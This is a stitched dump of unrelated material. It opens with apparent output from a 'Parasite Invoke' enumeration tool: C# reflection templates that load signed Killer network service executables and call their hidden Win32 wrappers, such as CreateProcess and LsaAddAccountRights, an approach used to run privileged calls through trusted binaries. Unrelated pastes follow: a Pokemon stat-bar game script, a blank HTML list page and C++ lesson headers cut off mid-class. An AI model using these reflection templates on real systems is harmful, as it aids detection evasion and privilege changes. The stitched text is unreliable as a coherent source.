[FILE] C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe

Method: ChangeServiceConfig2
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""ChangeServiceConfig2"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hService, SERVICE_CONFIG_INFOLEVEL dwInfoLevel, IntPtr lpInfo });
        ===END SIGNATURE===

Method: ChangeServiceConfig2
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""ChangeServiceConfig2"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hService, SERVICE_CONFIG_INFOLEVEL dwInfoLevel, SERVICE_FAILURE_ACTIONS& sfa });
        ===END SIGNATURE===

Method: OpenSCManager
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""OpenSCManager"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string machineName, string databaseName, uint dwAccess });
        ===END SIGNATURE===

Method: OpenService
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""OpenService"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess });
        ===END SIGNATURE===

Method: CloseServiceHandle
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""CloseServiceHandle"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hSCObject });
        ===END SIGNATURE===

Method: SetServiceStatus
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""SetServiceStatus"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hServiceStatus, SERVICE_STATUS& lpServiceStatus });
        ===END SIGNATURE===

Method: LsaOpenPolicy
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LsaOpenPolicy"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { LSA_UNICODE_STRING& SystemName, LSA_OBJECT_ATTRIBUTES& ObjectAttributes, int DesiredAccess, IntPtr& PolicyHandle });
        ===END SIGNATURE===

Method: LsaAddAccountRights
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LsaAddAccountRights"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr PolicyHandle, IntPtr AccountSid, LSA_UNICODE_STRING[] UserRights, uint CountOfRights });
        ===END SIGNATURE===

Method: FreeSid
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""FreeSid"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntPtr pSid });
        ===END SIGNATURE===

Method: LookupAccountName
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LookupAccountName"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { string lpSystemName, string lpAccountName, IntPtr psid, Int32& cbsid, StringBuilder domainName, Int32& cbdomainLength, Int32& use });
        ===END SIGNATURE===

Method: IsValidSid
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""IsValidSid"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr pSid });
        ===END SIGNATURE===

Method: LsaClose
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LsaClose"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr ObjectHandle });
        ===END SIGNATURE===

Method: LsaNtStatusToWinError
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LsaNtStatusToWinError"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { uint status });
        ===END SIGNATURE===

Method: SetStdHandle
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.Kernel32"", true);
        var methodInfo = t.GetMethod(""SetStdHandle"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { int device, IntPtr handle });
        ===END SIGNATURE===

Method: CreateProcess
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.Kernel32"", true);
        var methodInfo = t.GetMethod(""CreateProcess"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, STARTUPINFO& lpStartupInfo, PROCESS_INFORMATION& lpProcessInformation });
        ===END SIGNATURE===

Method: GetLastError
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.Kernel32"", true);
        var methodInfo = t.GetMethod(""GetLastError"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: FindWindow
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""FindWindow"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string lpClassName, string lpWindowName });
        ===END SIGNATURE===

Method: AttachConsole
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""AttachConsole"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { uint dwProcessId });
        ===END SIGNATURE===

Method: FreeConsole
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""FreeConsole"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: SetConsoleCtrlHandler
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""SetConsoleCtrlHandler"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { ConsoleCtrlDelegate HandlerRoutine, bool Add });
        ===END SIGNATURE===

Method: GenerateConsoleCtrlEvent
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""GenerateConsoleCtrlEvent"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { CtrlTypes dwCtrlEvent, uint dwProcessGroupId });
        ===END SIGNATURE===
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe

Method: ChangeServiceConfig2
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""ChangeServiceConfig2"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hService, SERVICE_CONFIG_INFOLEVEL dwInfoLevel, IntPtr lpInfo });
        ===END SIGNATURE===

Method: ChangeServiceConfig2
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""ChangeServiceConfig2"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hService, SERVICE_CONFIG_INFOLEVEL dwInfoLevel, SERVICE_FAILURE_ACTIONS& sfa });
        ===END SIGNATURE===

Method: OpenSCManager
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""OpenSCManager"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string machineName, string databaseName, uint dwAccess });
        ===END SIGNATURE===

Method: OpenService
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""OpenService"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess });
        ===END SIGNATURE===

Method: CloseServiceHandle
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""CloseServiceHandle"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hSCObject });
        ===END SIGNATURE===

Method: SetServiceStatus
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""SetServiceStatus"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hServiceStatus, SERVICE_STATUS& lpServiceStatus });
        ===END SIGNATURE===

Method: LsaOpenPolicy
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LsaOpenPolicy"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { LSA_UNICODE_STRING& SystemName, LSA_OBJECT_ATTRIBUTES& ObjectAttributes, int DesiredAccess, IntPtr& PolicyHandle });
        ===END SIGNATURE===

Method: LsaAddAccountRights
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LsaAddAccountRights"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr PolicyHandle, IntPtr AccountSid, LSA_UNICODE_STRING[] UserRights, uint CountOfRights });
        ===END SIGNATURE===

Method: FreeSid
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""FreeSid"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntPtr pSid });
        ===END SIGNATURE===

Method: LookupAccountName
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LookupAccountName"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { string lpSystemName, string lpAccountName, IntPtr psid, Int32& cbsid, StringBuilder domainName, Int32& cbdomainLength, Int32& use });
        ===END SIGNATURE===

Method: IsValidSid
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""IsValidSid"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr pSid });
        ===END SIGNATURE===

Method: LsaClose
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LsaClose"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr ObjectHandle });
        ===END SIGNATURE===

Method: LsaNtStatusToWinError
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LsaNtStatusToWinError"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { uint status });
        ===END SIGNATURE===

Method: SetStdHandle
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.Kernel32"", true);
        var methodInfo = t.GetMethod(""SetStdHandle"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { int device, IntPtr handle });
        ===END SIGNATURE===

Method: CreateProcess
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.Kernel32"", true);
        var methodInfo = t.GetMethod(""CreateProcess"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, STARTUPINFO& lpStartupInfo, PROCESS_INFORMATION& lpProcessInformation });
        ===END SIGNATURE===

Method: GetLastError
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.Kernel32"", true);
        var methodInfo = t.GetMethod(""GetLastError"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: FindWindow
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""FindWindow"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string lpClassName, string lpWindowName });
        ===END SIGNATURE===

Method: AttachConsole
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""AttachConsole"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { uint dwProcessId });
        ===END SIGNATURE===

Method: FreeConsole
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""FreeConsole"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: SetConsoleCtrlHandler
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""SetConsoleCtrlHandler"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { ConsoleCtrlDelegate HandlerRoutine, bool Add });
        ===END SIGNATURE===

Method: GenerateConsoleCtrlEvent
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendUtilityService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""GenerateConsoleCtrlEvent"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { CtrlTypes dwCtrlEvent, uint dwProcessGroupId });
        ===END SIGNATURE===
-------------"
S5pDxxCu,Untitled,IncandescenceSy,C,Thursday 7th of March 2024 02:03:18 PM CDT,"task _GameInit()
{
	// Pokemon Stat Bar Creator
	// HSM = useHighStatMove is for handling extremely high stats
	// useStatChange = will show oldStat -> newStat
	// useBstChange = will show oldBst -> newBst
	
	//int[] stats = [100 + 100 + 100 + 55 + 87, 150 + 85 + 85 + 55 + 60, 90 + 100 + 80 + 55 + 95, 180 + 135 + 165 + 135 + 133, 160 + 115 + 100 + 135 + 91, 90 + 135 + 150 + 135 + 84];
	//int[] stats = [100 + 100 + 154 + 100 + 100, 135 + 165 + 140 + 135 + 180, 115 + 150 + 108 + 120 + 160, 85 + 85 + 50 + 60 + 150, 100 + 130 + 68 + 85 + 90, 135 + 50 + 50 + 50 + 90];
	int[] stats = [133, 35, 45, 80, 60, 107];
	string[] statTypes = [""HP"", ""Atk"", ""Def"", ""SpA"", ""SpD"", ""Spe"", ""BST""];
	
	bool useHighStatMode = false;
	bool useStatChange = true;
	bool useBstChange = false;
	
	int[] statChange = [75, 55, 70, 55, 95, 110];
	
	int iter = 0;
	for each(string i in ref statTypes)
	{
		CreateStatName(i, iter);
		iter++;
	}
	
	int bst = 0;
	int bstChange = 0;
	iter = 0;
	
	for each(int i in ref stats)
	{
		CreateStatBar(i, iter);
		
		string num = (i < 100) ? (""0"" ~ itoa(i)) : itoa(i);
		
		if(useStatChange)
		{
			int j = statChange[iter];
			string num2 = (j < 100) ? (""0"" ~ itoa(j)) : itoa(j);
			num = num2 ~ "" -> "" ~ num;
			
			bstChange += j;
		}
		
		int statNum = useHighStatMode ? 190 + (i / 2) : 190 + (i * 3);
		
		int statNumber = CreateTextObject
		(
			num, ""Lucida Console"", 10,
			statNum, 80 + (iter * 55),
			50, 500, ALIGNMENT_LEFT,
			BORDER_NONE, 0,
			COLOR_WHITE, COLOR_WHITE, COLOR_RED
		);
		
		iter++;
		
		bst += i;
	};
	
	string bstTextDisplay = useStatChange && useBstChange ? itoa(bstChange) ~ "" -> "" ~ itoa(bst) : itoa(bst);
	
	int bstText = CreateTextObject
	(
		bstTextDisplay, ""Lucida Console"", 10,
		180, 80 + 330,
		50, 500, ALIGNMENT_LEFT,
		BORDER_NONE, 0,
		COLOR_WHITE, COLOR_WHITE, COLOR_RED
	);
}

function<void> CreateStatName(string stat, int iter)
{
	int statName = CreateTextObject
	(
		stat, ""Lucida Console"", 10,
		80, 80 + (iter * 55),
		50, 500, ALIGNMENT_LEFT,
		BORDER_NONE, 0,
		COLOR_WHITE, COLOR_WHITE, COLOR_RED
	);
}
 
function<void> CreateStatBar(int num, int index)
{
	
	int bar = CreatePrimObject(10, PRIMITIVE_TRIANGLESTRIP, 4);
	
	int py = 103 + (index * 55);
	
	ObjPrim_SetVertexPosition(bar, 0, 180, py - 15, 0); // top left
	ObjPrim_SetVertexPosition(bar, 1, 180, py + 15, 0); // bottom left
	if(!useHighStatMode)
	{
		ObjPrim_SetVertexPosition(bar, 2, 180 + (num * 3), py - 15, 0); // top right
		ObjPrim_SetVertexPosition(bar, 3, 180 + (num * 3), py + 15, 0); // bottom right
	}else
	{
		ObjPrim_SetVertexPosition(bar, 2, 180 + (num / 2), py - 15, 0); // top right HSM
		ObjPrim_SetVertexPosition(bar, 3, 180 + (num / 2), py + 15, 0); // bottom right HSM
	}
	
	int hue = useHighStatMode ? num - 220 : max(0, num - 45);
	if(num >= 105) hue += 20;
	if(num >= 135) hue += 15;
	if(num >= 150) hue += 10;
	if(num >= 580) hue += 90; // HSM
	int s = 255;
	if(num >= 700) s = 0; // HSM
	hue = min(hue, 300); // HSM
	
	ObjPrim_SetVertexColorHSV(bar, 0, hue, s, 255);
	ObjPrim_SetVertexColorHSV(bar, 1, hue, s, 190);
	ObjPrim_SetVertexColorHSV(bar, 2, hue, s, 255);
	ObjPrim_SetVertexColorHSV(bar, 3, hue, s, 190);
}
"
dy1Nv7FX,Untitled,lemansky,HTML,Thursday 7th of March 2024 01:59:33 PM CDT,"<!DOCTYPE html>
<html lang=""en"">
<head>
	<meta charset=""UTF-8"">
	<meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
	<title>Document</title>
	<style>
		ul{
			box-sizing: border-box;
			width:30rem;
			list-style-type: none;
			display:flex;
			flex-wrap: wrap;
			justify-content: space-between;
		}
		li{
			height:3rem;
			width:3rem;
			margin:1rem;
			border-radius:100%;
			background-color: rgb(239 68 68);
			display:flex;
			align-items: center;
			justify-content: center;
			font-size:0px;
		}
	</style>
</head>
<body>
	<ul id=""list"">
		<li>d</li>
		<li>e</li>
		<li>b</li>
		<li>u</li>
		<li>g</li>
		<li>p</li>
		<li>a</li>
		<li>t</li>
		<li>c</li>
		<li>h</li>
	</ul>
	<script>
		
	</script>
</body>
</html>"
gw1rJJSY,СПРИНТ № 5 | Распределение кода по файлам | Урок 3: Директива #include 2/2,chevengur,C++,Thursday 7th of March 2024 01:48:17 PM CDT,"painter.h

#pragma once
#include ""wall.h""

class Painter {
public:
    void Paint(Wall& wall, Wall::Color color_) {
        wall.SetColor(color_);
    }
};

***************************************************************************************************************************************
wall.h

#pragma once

class Wall {
public:
    enum class Color { BLUE, GREEN, RED, WHITE, YELLOW };

    Wall(double width, double height)
        : width_(width)
        , height_(height)
        , color_(Color::WHITE) {
    }

    double GetHeight() const {
        return height_;
    }
    double GetWidth() const {
        return width_;
    }
